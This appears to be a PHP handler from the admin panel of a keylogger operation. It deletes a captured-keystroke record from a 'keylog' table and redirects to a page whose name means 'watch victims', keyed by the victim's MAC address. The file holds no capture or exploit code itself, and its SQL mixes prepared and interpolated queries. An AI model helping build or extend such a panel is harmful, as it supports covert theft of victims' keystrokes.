<?php
include("vt.php");
ob_start();
session_start();//eğer id admin tarafından girilmediyse giriş sayfasına yönlendiriyoruz
			if(!isset($_SESSION["login"])){
  
  header("Location:index.php");
  exit();
  }
  

$cekilen_id=htmlspecialchars(strip_tags(addslashes(stripslashes($_GET["id"]))));//tüm html kodlardan ayırıyoruz.


if (!is_numeric($cekilen_id)) {//burada gelen id nin sayı olup olmadığı test edildi
header("location:index.php");    
}else{
    
 $query  = $db -> prepare("SELECT * FROM keylog WHERE id = :id");
    $query -> execute(['id' => $cekilen_id]);
    $row    = $query -> fetchAll(PDO::FETCH_ASSOC);
    foreach ($row as $item) {
      $link=$item['macadres'];
    }

$sil =$db->exec("DELETE FROM keylog WHERE id=$cekilen_id");		//verimizi veritabanından siliyoruz
$db=null;


header("location:kurbanlarizle.php?id=".$link);
}
  
		ob_end_flush();
?>